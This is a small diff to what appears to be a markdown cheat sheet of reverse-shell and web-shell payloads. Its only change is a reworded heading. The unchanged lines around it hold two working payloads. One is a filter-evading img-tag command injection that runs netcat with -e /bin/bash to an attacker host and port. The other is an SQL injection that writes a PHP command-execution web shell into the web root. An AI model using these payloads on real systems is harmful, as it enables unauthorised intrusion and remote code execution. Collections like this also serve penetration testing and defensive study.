@@ -353,7 +353,7 @@ https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
 <img src=http://localhost/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'<LHOST>'$IFS'<LPORT>')>
 ```
 
-### SQLi create webshell (Submission by @Legacyy)
+### SQLi create webshell (Submitted by @Legacyy)
 ```
 SELECT ("<?php echo system($_GET['cmd']); ?>") INTO OUTFILE "/var/www/html/payload.php"
 ```
